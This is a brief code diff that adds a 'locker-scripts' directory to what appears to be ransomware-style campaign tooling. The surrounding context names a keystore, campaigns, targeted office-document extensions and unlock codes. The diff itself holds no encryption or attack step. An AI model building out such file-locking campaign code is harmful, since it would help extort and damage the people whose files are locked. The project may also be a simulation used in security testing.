@@ -64,6 +64,7 @@ export type LockerStatus = {
 
 const KEYSTORE_DIR = path.join(process.cwd(), ".keystore");
 const CAMPAIGNS_DIR = path.join(process.cwd(), ".campaigns");
+const LOCKER_SCRIPTS_DIR = path.join(process.cwd(), "locker-scripts");
 
 const DEFAULT_EXTENSIONS = [
   ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
@@ -186,6 +187,7 @@ export function createCampaign(
 ): LockerCampaign {
   ensureDir(CAMPAIGNS_DIR);
   ensureDir(KEYSTORE_DIR);
+  ensureDir(LOCKER_SCRIPTS_DIR);
 
   const id = crypto.randomUUID().slice(0, 8);
   const unlockCode = generateUnlockCode();
